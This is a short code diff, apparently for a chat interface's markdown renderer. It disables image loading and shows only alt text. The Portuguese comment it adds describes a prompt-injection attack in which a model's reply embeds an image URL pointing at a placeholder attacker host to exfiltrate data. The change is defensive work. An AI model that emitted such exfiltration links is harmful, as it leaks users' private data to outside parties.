@@ -20,6 +20,12 @@ const mdComponents = {
       </div>
     );
   },
+  // Imagens desabilitadas: uma resposta induzida por prompt injection poderia
+  // usar ![](http://atacante/?x=dado) para exfiltrar dados via fetch automático.
+  // Mostra só o texto alternativo, sem carregar recurso externo.
+  img({ node, alt }) {
+    return alt ? <span>{alt}</span> : null;
+  },
 };
 
 // Formata os argumentos de uma tool de forma compacta: k=v, k=v
